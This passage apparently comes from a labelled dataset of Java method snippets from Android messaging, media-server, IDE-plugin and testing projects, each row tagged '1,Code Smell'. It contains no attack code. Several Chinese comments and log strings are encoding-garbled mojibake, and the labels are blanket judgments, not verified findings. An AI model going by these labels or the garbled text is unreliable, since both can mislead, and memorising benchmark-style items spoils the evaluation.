 * @param id 琚鍒跺叕鍏辨楠d
 */
@Override @Transactional(rollbackFor=Exception.class) public void copyPublicSetpsIds(int id){
  PublicSteps ps=publicStepsMapper.selectById(id);
  ps.setId(null).setName(ps.getName() + ""_copy"");
  save(ps);
  LambdaQueryWrapper<PublicStepsSteps> queryWrapper=new LambdaQueryWrapper<>();
  List<PublicStepsSteps> list=publicStepsStepsMapper.selectList(queryWrapper.eq(PublicStepsSteps::getPublicStepsId,id));
  List<Steps> oldStepsList=new ArrayList<>();
  for (  PublicStepsSteps publicStepsSteps : list) {
    oldStepsList.add(stepsMapper.selectById(publicStepsSteps.getStepsId()));
  }
  List<StepsDTO> oldStepsDtoList=new ArrayList<>();
  for (  Steps steps : oldStepsList) {
    oldStepsDtoList.add(steps.convertTo());
  }
  List<StepsDTO> stepsDTOS=stepsService.handleSteps(oldStepsDtoList,false);
  List<StepsDTO> needAllCopySteps=stepsService.getChildSteps(stepsDTOS);
  List<PublicStepsAndStepsIdDTO> oldStepDto=stepsService.stepAndIndex(needAllCopySteps);
  int n=1;
  List<Integer> publicStepsStepsId=new ArrayList<>();
  for (  StepsDTO steps : needAllCopySteps) {
    Steps step=steps.convertTo();
    if (step.getParentId() != 0) {
      Integer fatherIdIndex=0;
      Integer idIndex=0;
      for (      PublicStepsAndStepsIdDTO stepsIdDTO : oldStepDto) {
        if (stepsIdDTO.getStepsDTO().convertTo().equals(step)) {
          fatherIdIndex=stepsIdDTO.getIndex();
        }
        if (stepsIdDTO.getStepsDTO().convertTo().equals(stepsMapper.selectById(step.getParentId()))) {
          idIndex=stepsIdDTO.getIndex();
        }
      }
      step.setId(null).setParentId(fatherIdIndex).setCaseId(0).setSort(stepsMapper.findMaxSort() + n);
      stepsMapper.insert(step.setCaseId(0));
      step.setParentId(step.getId() - (fatherIdIndex - idIndex));
      stepsMapper.updateById(step);
      n++;
      if (steps.getElements() != null) {
        elementsService.newStepBeLinkedEle(steps,step);
      }
      continue;
    }
    step.setId(null).setCaseId(0).setSort(stepsMapper.findMaxSort() + n);
    stepsMapper.insert(step);
    if (steps.getElements() != null) {
      elementsService.newStepBeLinkedEle(steps,step);
    }
    publicStepsStepsId.add(step.getId());
    n++;
  }
  for (  Integer stepsId : publicStepsStepsId) {
    publicStepsStepsMapper.insert(new PublicStepsSteps().setPublicStepsId(ps.getId()).setStepsId(stepsId));
  }
}",1,Code Smell
"private void openDocumentsLayout(boolean show){
  if (!documentsEnabled) {
    if (show) {
      restrictedLayout=new ChatAttachRestrictedLayout(4,this,getContext(),resourcesProvider);
      showLayout(restrictedLayout);
    }
  }
  if (documentLayout == null) {
    int type=isEmojiPicker ? ChatAttachAlertDocumentLayout.TYPE_EMOJI : isSoundPicker ? ChatAttachAlertDocumentLayout.TYPE_RINGTONE : ChatAttachAlertDocumentLayout.TYPE_DEFAULT;
    layouts[4]=documentLayout=new ChatAttachAlertDocumentLayout(this,getContext(),type,resourcesProvider);
    documentLayout.setDelegate(new ChatAttachAlertDocumentLayout.DocumentSelectActivityDelegate(){
      @Override public void didSelectFiles(      ArrayList<String> files,      String caption,      ArrayList<MessageObject> fmessages,      boolean notify,      int scheduleDate){
        if (documentsDelegate != null) {
          documentsDelegate.didSelectFiles(files,caption,fmessages,notify,scheduleDate);
        }
 else         if (baseFragment instanceof ChatAttachAlertDocumentLayout.DocumentSelectActivityDelegate) {
          ((ChatAttachAlertDocumentLayout.DocumentSelectActivityDelegate)baseFragment).didSelectFiles(files,caption,fmessages,notify,scheduleDate);
        }
 else         if (baseFragment instanceof PassportActivity) {
          ((PassportActivity)baseFragment).didSelectFiles(files,caption,notify,scheduleDate);
        }
      }
      @Override public void didSelectPhotos(      ArrayList<SendMessagesHelper.SendingMediaInfo> photos,      boolean notify,      int scheduleDate){
        if (documentsDelegate != null) {
          documentsDelegate.didSelectPhotos(photos,notify,scheduleDate);
        }
 else         if (baseFragment instanceof ChatActivity) {
          ((ChatActivity)baseFragment).didSelectPhotos(photos,notify,scheduleDate);
        }
 else         if (baseFragment instanceof PassportActivity) {
          ((PassportActivity)baseFragment).didSelectPhotos(photos,notify,scheduleDate);
        }
      }
      @Override public void startDocumentSelectActivity(){
        if (documentsDelegate != null) {
          documentsDelegate.startDocumentSelectActivity();
        }
 else         if (baseFragment instanceof ChatAttachAlertDocumentLayout.DocumentSelectActivityDelegate) {
          ((ChatAttachAlertDocumentLayout.DocumentSelectActivityDelegate)baseFragment).startDocumentSelectActivity();
        }
 else         if (baseFragment instanceof PassportActivity) {
          ((PassportActivity)baseFragment).startDocumentSelectActivity();
        }
      }
      @Override public void startMusicSelectActivity(){
        openAudioLayout(true);
      }
    }
);
  }
  if (baseFragment instanceof ChatActivity) {
    ChatActivity chatActivity=(ChatActivity)baseFragment;
    TLRPC.Chat currentChat=chatActivity.getCurrentChat();
    documentLayout.setMaxSelectedFiles(currentChat != null && !ChatObject.hasAdminRights(currentChat) && currentChat.slowmode_enabled || editingMessageObject != null ? 1 : -1);
  }
 else {
    documentLayout.setMaxSelectedFiles(maxSelectedPhotos);
    documentLayout.setCanSelectOnlyImageFiles(!isSoundPicker && !isEmojiPicker && !allowEnterCaption);
  }
  documentLayout.isSoundPicker=isSoundPicker;
  documentLayout.isEmojiPicker=isEmojiPicker;
  if (show) {
    showLayout(documentLayout);
  }
}",1,Code Smell
"@NonNull public String[] getAllPermissions(){
  if (mUsedPermissions == null) {
    Set<String> usedPermissions=new HashSet<>();
    if (mPackageInfo.requestedPermissions != null) {
      Collections.addAll(usedPermissions,mPackageInfo.requestedPermissions);
    }
    if (mPackageInfo.permissions != null) {
      for (      PermissionInfo perm : mPackageInfo.permissions) {
        usedPermissions.add(perm.name);
      }
    }
    if (mPackageInfo.activities != null) {
      for (      ActivityInfo info : mPackageInfo.activities) {
        if (info.permission != null) {
          usedPermissions.add(info.permission);
        }
      }
    }
    if (mPackageInfo.services != null) {
      for (      ServiceInfo info : mPackageInfo.services) {
        if (info.permission != null) {
          usedPermissions.add(info.permission);
        }
      }
    }
    if (mPackageInfo.receivers != null) {
      for (      ActivityInfo info : mPackageInfo.receivers) {
        if (info.permission != null) {
          usedPermissions.add(info.permission);
        }
      }
    }
    mUsedPermissions=usedPermissions.toArray(new String[0]);
  }
  return mUsedPermissions;
}",1,Code Smell
"@Override public void onRequestPermissionsResultFragment(int requestCode,String[] permissions,int[] grantResults){
  if (requestCode == 1) {
    for (int a=0; a < permissions.length; a++) {
      if (grantResults.length <= a) {
        continue;
      }
switch (permissions[a]) {
case Manifest.permission.POST_NOTIFICATIONS:
        if (grantResults[a] == PackageManager.PERMISSION_GRANTED) {
          NotificationsController.getInstance(currentAccount).showNotifications();
        }
 else {
          NotificationPermissionDialog.askLater();
        }
      break;
case Manifest.permission.READ_CONTACTS:
    if (grantResults[a] == PackageManager.PERMISSION_GRANTED) {
      AndroidUtilities.runOnUIThread(() -> getNotificationCenter().postNotificationName(NotificationCenter.forceImportContactsStart));
      getContactsController().forceImportContacts();
    }
 else {
      MessagesController.getGlobalNotificationsSettings().edit().putBoolean(""askAboutContacts"",askAboutContacts=false).apply();
    }
  break;
case Manifest.permission.WRITE_EXTERNAL_STORAGE:
if (grantResults[a] == PackageManager.PERMISSION_GRANTED) {
  ImageLoader.getInstance().checkMediaPaths();
}
break;
}
}
if (askingForPermissions) {
askingForPermissions=false;
showFiltersHint();
}
}
 else if (requestCode == 4) {
boolean allGranted=true;
for (int a=0; a < grantResults.length; a++) {
if (grantResults[a] != PackageManager.PERMISSION_GRANTED) {
allGranted=false;
break;
}
}
}
}",1,Code Smell
"protected void parseSetArgs(String... args) throws IllegalArgumentException, IllegalAccessException {
  this.orginalArgs=args;
  List<String> remainsOptions=new ArrayList<String>();
  Set<Option> requiredOpts=collectRequriedOptions(optMap);
  Option needArgOpt=null;
  for (  String s : args) {
    if (needArgOpt != null) {
      Field field=needArgOpt.field;
      Class clazz=field.getType();
      if (clazz.equals(List.class)) {
        try {
          List<Object> object=((List<Object>)field.get(this));
          ParameterizedType listGenericType=(ParameterizedType)field.getGenericType();
          Type[] listActualTypeArguments=listGenericType.getActualTypeArguments();
          Class typeClazz=(Class)listActualTypeArguments[0];
          object.add(convert(s,typeClazz));
        }
 catch (        Exception e) {
          e.printStackTrace();
        }
      }
 else {
        field.set(this,convert(s,clazz));
      }
      needArgOpt=null;
    }
 else     if (s.startsWith(""-"")) {
      Option opt=optMap.get(s);
      requiredOpts.remove(opt);
      if (opt == null) {
        System.err.println(""ERROR: Unrecognized option: "" + s);
        throw new HelpException();
      }
 else {
        if (opt.hasArg) {
          needArgOpt=opt;
        }
 else {
          opt.field.set(this,true);
        }
      }
    }
 else {
      remainsOptions.add(s);
    }
  }
  if (needArgOpt != null) {
    System.err.println(""ERROR: Option "" + needArgOpt.getOptAndLongOpt() + "" need an argument value"");
    throw new HelpException();
  }
  this.remainingArgs=remainsOptions.toArray(new String[remainsOptions.size()]);
  if (this.printHelp) {
    throw new HelpException();
  }
  if (!requiredOpts.isEmpty()) {
    StringBuilder sb=new StringBuilder();
    sb.append(""ERROR: Options: "");
    boolean first=true;
    for (    Option option : requiredOpts) {
      if (first) {
        first=false;
      }
 else {
        sb.append("" and "");
      }
      sb.append(option.getOptAndLongOpt());
    }
    sb.append("" is required"");
    System.err.println(sb.toString());
    throw new HelpException();
  }
}",1,Code Smell
"@Override public synchronized void actionPerformed(AnActionEvent anActionEvent,Config config){
  NavigatorAction navigatorAction=WindowFactory.getDataContext(anActionEvent.getProject()).getData(DataKeys.LEETCODE_PROJECTS_NAVIGATORACTION);
  if (StringUtils.isBlank(HttpRequestUtils.getToken())) {
    HttpResponse response=HttpRequest.builderGet(URLUtils.getLeetcodeVerify()).request();
    if (response.getStatusCode() != 200) {
      MessageUtils.getInstance(anActionEvent.getProject()).showWarnMsg(""warning"",PropertiesUtils.getInfo(""request.failed""));
      return;
    }
  }
 else {
    if (HttpRequestUtils.isLogin(anActionEvent.getProject())) {
      MessageUtils.getInstance(anActionEvent.getProject()).showWarnMsg(""info"",PropertiesUtils.getInfo(""login.exist""));
      NavigatorTabsPanel.loadUser(true);
      if (navigatorAction.getPageInfo().getRowTotal() == 0) {
        ApplicationManager.getApplication().getMessageBus().syncPublisher(LoginNotifier.TOPIC).login(anActionEvent.getProject(),config.getUrl());
      }
      return;
    }
  }
  if (StringUtils.isBlank(config.getLoginName())) {
    MessageUtils.getInstance(anActionEvent.getProject()).showWarnMsg(""info"",PropertiesUtils.getInfo(""config.user""));
    return;
  }
  if (StringUtils.isNotBlank(config.getCookie(config.getUrl() + config.getLoginName()))) {
    List<HttpCookie> cookieList=CookieUtils.toHttpCookie(config.getCookie(config.getUrl() + config.getLoginName()));
    HttpRequestUtils.setCookie(cookieList);
    if (HttpRequestUtils.isLogin(anActionEvent.getProject())) {
      MessageUtils.getInstance(anActionEvent.getProject()).showInfoMsg(""login"",PropertiesUtils.getInfo(""login.success""));
      NavigatorTabsPanel.loadUser(true);
      ApplicationManager.getApplication().getMessageBus().syncPublisher(LoginNotifier.TOPIC).login(anActionEvent.getProject(),config.getUrl());
      return;
    }
 else {
      config.addCookie(config.getUrl() + config.getLoginName(),null);
      PersistentConfig.getInstance().setInitConfig(config);
    }
  }
  if (!HttpLogin.ajaxLogin(config,navigatorAction,anActionEvent.getProject())) {
    ApplicationManager.getApplication().invokeLater(new Runnable(){
      @Override public void run(){
        LoginPanel loginPanel=new LoginPanel(anActionEvent.getProject());
        loginPanel.show();
      }
    }
);
  }
}",1,Code Smell
"public void getDriversMap(ArrayList<DriverInfo> drivers){
  for (  DriverInfo driverInfo : drivers) {
    DesiredCapabilities caps=new DesiredCapabilities();
    caps.setCapability(""newCommandTimeout"",4000);
    caps.setCapability(""clearDeviceLogonStart"",true);
    caps.setCapability(""noReset"",true);
    if (driverInfo.getPlatform().equalsIgnoreCase(""android"")) {
      caps.setCapability(""automationName"",""uiautomator2"");
      AndroidDriver androidDriver=null;
      if (service != null) {
        androidDriver=new AndroidDriver(service.getUrl(),caps);
      }
      AndroidDriverController androidDriverController=new AndroidDriverController(androidDriver,""androidTest"",logger);
      driverControllerMap.put(driverInfo.getId(),androidDriverController);
      if (driverInfo.getLauncherApp() != null && driverInfo.getLauncherApp().length() > 0 && service != null) {
        androidDriverController.activateApp(driverInfo.getLauncherApp());
      }
    }
    if (driverInfo.getPlatform().equalsIgnoreCase(""windows"")) {
      String app=""Root"";
      if (driverInfo.getLauncherApp() != null && !driverInfo.getLauncherApp().equalsIgnoreCase(""root"") && driverInfo.getLauncherApp().length() > 0) {
        app=driverInfo.getLauncherApp() + ""!app"";
      }
      caps.setCapability(""app"",app);
      WindowsDriver windowsDriver=null;
      if (service != null) {
        windowsDriver=new WindowsDriver(service.getUrl(),caps);
      }
      driverControllerMap.put(driverInfo.getId(),new WindowsDriverController(windowsDriver,""windowsTest"",logger));
    }
  }
}",1,Code Smell
"@Override public void onAttachedToWindow(){
  super.onAttachedToWindow();
  if (springAnimation == null) {
    springAnimation=new SpringAnimation(this,ACTION_BAR_TRANSITION_PROGRESS_VALUE).setSpring(new SpringForce().setStiffness(1200f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY)).addEndListener((animation,canceled,value,velocity) -> {
      ChatActivity chatActivity=parentEnterView.getParentFragment();
      ChatAvatarContainer chatAvatarContainer=chatActivity.getAvatarContainer();
      chatAvatarContainer.setClickable(value == 0);
      chatAvatarContainer.getAvatarImageView().setClickable(value == 0);
      ActionBar actionBar=chatActivity.getActionBar();
      if (value == 100 && parentEnterView.hasBotWebView()) {
        chatActivity.showHeaderItem(false);
        checkBotMenuItem();
        botMenuItem.setVisibility(VISIBLE);
        actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
          @Override public void onItemClick(          int id){
            if (id == -1) {
              if (!webViewContainer.onBackPressed()) {
                onCheckDismissByUser();
              }
            }
 else             if (id == R.id.menu_reload_page) {
              if (webViewContainer.getWebView() != null) {
                webViewContainer.getWebView().animate().cancel();
                webViewContainer.getWebView().animate().alpha(0).start();
              }
              isLoaded=false;
              progressView.setLoadProgress(0);
              progressView.setAlpha(1f);
              progressView.setVisibility(VISIBLE);
              webViewContainer.setBotUser(MessagesController.getInstance(currentAccount).getUser(botId));
              webViewContainer.loadFlickerAndSettingsItem(currentAccount,botId,settingsItem);
              webViewContainer.reload();
            }
 else             if (id == R.id.menu_settings) {
              webViewContainer.onSettingsButtonPressed();
            }
 else             if (id == R.id.menu_add_to_home_screen_bot) {
              MediaDataController.getInstance(currentAccount).installShortcut(botId,MediaDataController.SHORTCUT_TYPE_ATTACHED_BOT);
            }
 else             if (id == R.id.menu_tos_bot) {
              Browser.openUrl(getContext(),LocaleController.getString(R.string.BotWebViewToSLink));
            }
          }
        }
);
      }
 else {
        chatActivity.showHeaderItem(true);
        if (botMenuItem != null) {
          botMenuItem.setVisibility(GONE);
        }
        actionBar.setActionBarMenuOnItemClick(actionBarOnItemClick);
      }
    }
);
  }
  NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.webViewResultSent);
  NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.didSetNewTheme);
}",1,Code Smell
"public static boolean supportsBatching(List<String> serverVersion){
  if (serverVersion.size() > 0) {
    String server=serverVersion.get(0).toLowerCase(Locale.ROOT);
    if (server.contains(""electrumx"")) {
      return true;
    }
    if (server.startsWith(""cormorant"")) {
      return true;
    }
    if (server.startsWith(""electrs/"")) {
      String electrsVersion=server.substring(""electrs/"".length());
      int dashIndex=electrsVersion.indexOf('-');
      if (dashIndex > -1) {
        electrsVersion=electrsVersion.substring(0,dashIndex);
      }
      try {
        Version version=new Version(electrsVersion);
        if (version.compareTo(ELECTRS_MIN_BATCHING_VERSION) >= 0) {
          return true;
        }
      }
 catch (      Exception e) {
      }
    }
    if (server.startsWith(""fulcrum"")) {
      String fulcrumVersion=server.substring(""fulcrum"".length()).trim();
      int dashIndex=fulcrumVersion.indexOf('-');
      if (dashIndex > -1) {
        fulcrumVersion=fulcrumVersion.substring(0,dashIndex);
      }
      try {
        Version version=new Version(fulcrumVersion);
        if (version.compareTo(FULCRUM_MIN_BATCHING_VERSION) >= 0) {
          return true;
        }
      }
 catch (      Exception e) {
      }
    }
  }
  return false;
}",1,Code Smell
"@ApiOperation(value=""upDateInstanceLabel"",notes=""up date instance label"",response=Message.class) @ApiImplicitParams({@ApiImplicitParam(name=""applicationName"",dataType=""String""),@ApiImplicitParam(name=""instance"",required=false,dataType=""String"",value=""instance""),@ApiImplicitParam(name=""labels"",required=false,dataType=""List"",value=""labels""),@ApiImplicitParam(name=""labelKey"",dataType=""String""),@ApiImplicitParam(name=""stringValue"",dataType=""String"")}) @ApiOperationSupport(ignoreParameters={""jsonNode""}) @RequestMapping(path=""/instanceLabel"",method=RequestMethod.PUT) public Message upDateInstanceLabel(HttpServletRequest req,@RequestBody JsonNode jsonNode) throws Exception {
  String userName=ModuleUserUtils.getOperationUser(req,""upDateInstanceLabel"");
  if (Configuration.isNotAdmin(userName)) {
    throw new InstanceErrorException(String.format(ONLY_ADMIN_CAN_MODIFY.getErrorDesc() + "" The user [%s] is not admin"",userName));
  }
  String instanceName=jsonNode.get(""instance"").asText();
  String instanceType=jsonNode.get(""applicationName"").asText();
  if (StringUtils.isEmpty(instanceName)) {
    return Message.error(""instance cannot be empty(实例名不能为空"");
  }
  if (StringUtils.isEmpty(instanceType)) {
    return Message.error(""instance cannot be empty(实例类型不能为空"");
  }
  JsonNode labelsNode=jsonNode.get(""labels"");
  Iterator<JsonNode> labelKeyIterator=labelsNode.iterator();
  ServiceInstance instance=ServiceInstance.apply(instanceType,instanceName);
  List<Label<? extends Label<?>>> labels=new ArrayList<>();
  Set<String> keyList=LabelUtils.listAllUserModifiableLabel();
  Set<String> labelKeySet=new HashSet<>();
  while (labelKeyIterator.hasNext()) {
    JsonNode label=labelKeyIterator.next();
    String labelKey=label.get(""labelKey"").asText();
    String labelStringValue=label.get(""stringValue"").asText();
    if (labelStringValue != null && keyList.contains(labelKey)) {
      Label realLabel=labelBuilderFactory.createLabel(labelKey,labelStringValue);
      if (realLabel instanceof UserModifiable) {
        ((UserModifiable)realLabel).valueCheck(labelStringValue);
      }
      labelKeySet.add(labelKey);
      labels.add(realLabel);
    }
  }
  if (labelKeySet.size() != labels.size()) {
    throw new InstanceErrorException(INCLUDE_REPEAT.getErrorDesc());
  }
  insLabelService.refreshLabelsToInstance(labels,instance);
  InstanceInfo instanceInfo=insLabelService.getInstanceInfoByServiceInstance(instance);
  instanceInfo.setUpdateTime(new Date());
  insLabelService.updateInstance(instanceInfo);
  return Message.ok(""success"").data(""labels"",labels);
}
",1,Code Smell
"@Nullable private File getUpdatedZipFile(@NonNull Map<String,List<Action>> actionList) throws IOException {
  if (!Objects.requireNonNull(getOptions()).readWrite || actionList.isEmpty()) {
    return null;
  }
  String extension=getFile().getExtension();
  File file=FileCache.getGlobalFileCache().createCachedFile(extension);
  Map<String,ZipEntry> zipEntries=new HashMap<>();
  for (  ZipEntry zipEntry : Collections.list(Objects.requireNonNull(mZipFile).entries())) {
    zipEntries.put(Paths.sanitize(File.separator + zipEntry.getName(),false),zipEntry);
  }
  for (  String path : actionList.keySet()) {
    List<Action> actions=actionList.get(path);
    if (actions == null)     continue;
    for (    Action action : actions) {
      Node<?> targetNode=action.targetNode;
switch (action.action) {
case ACTION_CREATE:
        zipEntries.put(targetNode.getFullPath(),getNewZipEntry(targetNode));
      break;
case ACTION_DELETE:
    zipEntries.remove(targetNode.getFullPath());
  break;
case ACTION_UPDATE:
File cachedFile=Objects.requireNonNull(action.getCachedPath());
zipEntries.put(targetNode.getFullPath(),getZipEntry(targetNode,cachedFile));
break;
case ACTION_MOVE:
String sourcePath=Objects.requireNonNull(action.getSourcePath());
ZipEntry zipEntry=zipEntries.get(sourcePath);
if (zipEntry != null) {
zipEntries.put(targetNode.getFullPath(),zipEntry);
}
 else {
zipEntries.put(targetNode.getFullPath(),getNewZipEntry(targetNode));
}
zipEntries.remove(sourcePath);
break;
}
}
}
try (FileOutputStream os=new FileOutputStream(file);ZipOutputStream zos=new ZipOutputStream(os)){
zos.setMethod(ZipOutputStream.DEFLATED);
zos.setLevel(Deflater.BEST_COMPRESSION);
List<String> paths=new ArrayList<>(zipEntries.keySet());
Collections.sort(paths);
for (String path : paths) {
ZipEntry zipEntry=zipEntries.get(path);
if (zipEntry == null) continue;
if (zipEntry instanceof VirtualZipEntry) {
zos.putNextEntry(zipEntry);
if (zipEntry.isDirectory()) {
zos.closeEntry();
continue;
}
File cachedFile=((VirtualZipEntry)zipEntry).getCachedFile();
if (cachedFile != null) {
try (InputStream is=new FileInputStream(cachedFile)){
IoUtils.copy(is,zos);
}
 }
zos.closeEntry();
}
 else {
ZipEntry newZipEntry=getZipEntry(path,zipEntry);
zos.putNextEntry(newZipEntry);
if (zipEntry.isDirectory()) {
zos.closeEntry();
continue;
}
try (InputStream is=mZipFile.getInputStream(zipEntry)){
IoUtils.copy(is,zos);
}
 zos.closeEntry();
}
}
}
 return file;
}
",1,Code Smell
"private void updateAlbumsDropDown(){
  dropDownContainer.removeAllSubItems();
  if (mediaEnabled) {
    ArrayList<MediaController.AlbumEntry> albums;
    if (shouldLoadAllMedia()) {
      albums=MediaController.allMediaAlbums;
    }
 else {
      albums=MediaController.allPhotoAlbums;
    }
    dropDownAlbums=new ArrayList<>(albums);
    Collections.sort(dropDownAlbums,(o1,o2) -> {
      if (o1.bucketId == 0 && o2.bucketId != 0) {
        return -1;
      }
 else       if (o1.bucketId != 0 && o2.bucketId == 0) {
        return 1;
      }
      int index1=albums.indexOf(o1);
      int index2=albums.indexOf(o2);
      if (index1 > index2) {
        return 1;
      }
 else       if (index1 < index2) {
        return -1;
      }
 else {
        return 0;
      }
    }
);
  }
 else {
    dropDownAlbums=new ArrayList<>();
  }
  if (dropDownAlbums.isEmpty()) {
    dropDown.setCompoundDrawablesWithIntrinsicBounds(null,null,null,null);
  }
 else {
    dropDown.setCompoundDrawablesWithIntrinsicBounds(null,null,dropDownDrawable,null);
    for (int a=0, N=dropDownAlbums.size(); a < N; a++) {
      MediaController.AlbumEntry album=dropDownAlbums.get(a);
      AlbumButton btn=new AlbumButton(getContext(),album.coverPhoto,album.bucketName,album.photos.size(),resourcesProvider);
      dropDownContainer.getPopupLayout().addView(btn);
      final int i=a + 10;
      btn.setOnClickListener(v -> {
        parentAlert.actionBar.getActionBarMenuOnItemClick().onItemClick(i);
        dropDownContainer.toggleSubMenu();
      }
);
    }
  }
}",1,Code Smell
"private void unpackMethodInfo(AnnotationNode methodInfo,List<MethodDescriptor> mds){
  List<Object> values=methodInfo.values;
  List<org.objectweb.asm.Type> parameterTypes=new ArrayList<>();
  String name=null;
  for (int i=0; i < values.size(); i+=2) {
    String key=(String)values.get(i);
    Object value=values.get(i + 1);
    if (key.equals(""parameterTypes"")) {
      parameterTypes=(ArrayList<org.objectweb.asm.Type>)value;
    }
 else     if (key.equals(""name"")) {
      name=(String)value;
    }
  }
  boolean unresolvable=false;
  List<String> resolvedParameterTypes=new ArrayList<>();
  for (  org.objectweb.asm.Type ptype : parameterTypes) {
    String typeName=ptype.getClassName();
    if (typeSystem.isPrimitive(ptype) || typeSystem.isPrimitiveArray(ptype)) {
      resolvedParameterTypes.add(typeName);
    }
 else {
      Type resolvedType=typeSystem.resolveName(typeName,true);
      if (resolvedType != null) {
        resolvedParameterTypes.add(typeName);
      }
 else {
        unresolvable=true;
      }
    }
  }
  if (unresolvable) {
    StringBuilder message=new StringBuilder();
    for (    org.objectweb.asm.Type ptype : parameterTypes) {
      message.append(ptype.getClassName()).append("" "");
    }
    logger.debug(""Unable to fully resolve method "" + name + ""(""+ message.toString().trim()+ "")"");
  }
 else {
    mds.add(new MethodDescriptor(name,resolvedParameterTypes));
  }
}",1,Code Smell
"/** 
 * 寮鍚痳tpServer
 * @param mediaServerItem zlm鏈嶅姟瀹炰緥
 * @param streamId 娴両d
 * @param ssrc ssrc
 * @param port 绔彛锛 0/null涓轰娇鐢ㄩ殢鏈
 * @param reUsePort 鏄惁閲嶇敤绔彛
 * @param tcpMode 0/null udp 妯″紡锛1 tcp 琚姩妯″紡, 2 tcp 涓诲姩妯″紡銆
 * @return
 */
public int createRTPServer(MediaServer mediaServerItem,String streamId,long ssrc,Integer port,Boolean onlyAuto,Boolean reUsePort,Integer tcpMode){
  int result=-1;
  JSONObject rtpInfo=zlmresTfulUtils.getRtpInfo(mediaServerItem,streamId);
  logger.info(JSONObject.toJSONString(rtpInfo));
  if (rtpInfo.getInteger(""code"") == 0) {
    if (rtpInfo.getBoolean(""exist"")) {
      result=rtpInfo.getInteger(""local_port"");
      if (result == 0) {
        Map<String,Object> param=new HashMap<>();
        param.put(""stream_id"",streamId);
        JSONObject jsonObject=zlmresTfulUtils.closeRtpServer(mediaServerItem,param);
        if (jsonObject != null) {
          if (jsonObject.getInteger(""code"") == 0) {
            return createRTPServer(mediaServerItem,streamId,ssrc,port,onlyAuto,reUsePort,tcpMode);
          }
 else {
            logger.warn(""[寮鍚痳tpServer], 閲嶅惎RtpServer閿欒"");
          }
        }
      }
      return result;
    }
  }
 else   if (rtpInfo.getInteger(""code"") == -2) {
    return result;
  }
  Map<String,Object> param=new HashMap<>();
  if (tcpMode == null) {
    tcpMode=0;
  }
  param.put(""tcp_mode"",tcpMode);
  param.put(""stream_id"",streamId);
  if (reUsePort != null) {
    param.put(""re_use_port"",reUsePort ? ""1"" : ""0"");
  }
  if (port == null) {
    param.put(""port"",0);
  }
 else {
    param.put(""port"",port);
  }
  if (onlyAuto != null) {
    param.put(""only_audio"",onlyAuto ? ""1"" : ""0"");
  }
  if (ssrc != 0) {
    param.put(""ssrc"",ssrc);
  }
  JSONObject openRtpServerResultJson=zlmresTfulUtils.openRtpServer(mediaServerItem,param);
  logger.info(JSONObject.toJSONString(openRtpServerResultJson));
  if (openRtpServerResultJson != null) {
    if (openRtpServerResultJson.getInteger(""code"") == 0) {
      result=openRtpServerResultJson.getInteger(""port"");
    }
 else {
      logger.error(""鍒涘缓RTP Server 澶辫触 {}: "",openRtpServerResultJson.getString(""msg""));
    }
  }
 else {
    logger.error(""鍒涘缓RTP Server 澶辫触 {}: 璇锋鏌LM鏈嶅姟"",param.get(""port""));
  }
  return result;
}",1,Code Smell
"public void finishZoom(){
  if (finishZoomTransition != null) {
    return;
  }
  float zoom;
  if (useCamera2) {
    if (camera2SessionCurrent == null)     return;
    zoom=Utilities.clamp(pinchScale,camera2SessionCurrent.getMaxZoom(),camera2SessionCurrent.getMinZoom());
  }
 else {
    zoom=Math.min(1f,Math.max(0,pinchScale - 1f));
  }
  if (zoom > 0f) {
    finishZoomTransition=ValueAnimator.ofFloat(zoom,0);
    finishZoomTransition.addUpdateListener(valueAnimator -> {
      if (useCamera2) {
        if (camera2SessionCurrent != null) {
          camera2SessionCurrent.setZoom((float)valueAnimator.getAnimatedValue());
        }
      }
 else {
        if (cameraSession != null) {
          cameraSession.setZoom((float)valueAnimator.getAnimatedValue());
        }
      }
    }
);
    finishZoomTransition.addListener(new AnimatorListenerAdapter(){
      @Override public void onAnimationEnd(      Animator animation){
        if (finishZoomTransition != null) {
          finishZoomTransition=null;
        }
      }
    }
);
    finishZoomTransition.setDuration(350);
    finishZoomTransition.setInterpolator(CubicBezierInterpolator.DEFAULT);
    finishZoomTransition.start();
  }
}",1,Code Smell
"private static boolean methodHasSignature(JavaType.FullyQualified clazz,JavaType.Method m,String name,List<JavaType> argTypes){
  if (!name.equals(m.getName())) {
    return false;
  }
  List<JavaType> mArgs=m.getParameterTypes();
  if (mArgs.size() != argTypes.size()) {
    return false;
  }
  Map<JavaType,JavaType> parameterMap=new IdentityHashMap<>();
  List<JavaType> declaringTypeParams=m.getDeclaringType().getTypeParameters();
  List<JavaType> typeParameters=clazz.getTypeParameters();
  if (typeParameters.size() != declaringTypeParams.size()) {
    return false;
  }
  for (int j=0; j < typeParameters.size(); j++) {
    JavaType typeAttributed=typeParameters.get(j);
    JavaType generic=declaringTypeParams.get(j);
    parameterMap.put(generic,typeAttributed);
  }
  for (int i=0; i < mArgs.size(); i++) {
    JavaType declared=mArgs.get(i);
    JavaType actual=argTypes.get(i);
    if (!TypeUtils.isOfType(declared,actual)) {
      if (parameterMap.get(declared) != actual) {
        return false;
      }
    }
  }
  return true;
}",1,Code Smell
"@Override @SuppressWarnings(""deprecation"") protected void onCreate(@Nullable Bundle savedInstanceState){
  requestWindowFeature(Window.FEATURE_NO_TITLE);
  setContentView(R.layout.ctrl_consent);
  persistableUriPermission=new PersistableUriPermission(this);
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
    final WindowInsetsController insetsController=getWindow().getInsetsController();
    if (insetsController != null)     insetsController.hide(WindowInsets.Type.statusBars());
  }
 else {
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN);
  }
  getWindow().addFlags(WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_HIDDEN);
  super.onCreate(savedInstanceState);
  mCapHelper=new CaptureHelper(this,false);
  mCapHelper.setListener(success -> {
    setResult(success ? RESULT_OK : RESULT_CANCELED,null);
    finish();
  }
);
  Intent intent=getIntent();
  String action=intent.getStringExtra(""action"");
  if (action == null) {
    Log.e(TAG,""no action provided"");
    abort();
    return;
  }
  if (action.equals(ACTION_PEER_INFO)) {
    getPeerInfo();
    return;
  }
  mPermissions=PCAPdroid.getInstance().getCtrlPermissions();
  AppDescriptor app=getCallingApp();
  if (app != null) {
    CtrlPermissions.ConsentType consent=mPermissions.getConsent(app.getPackageName());
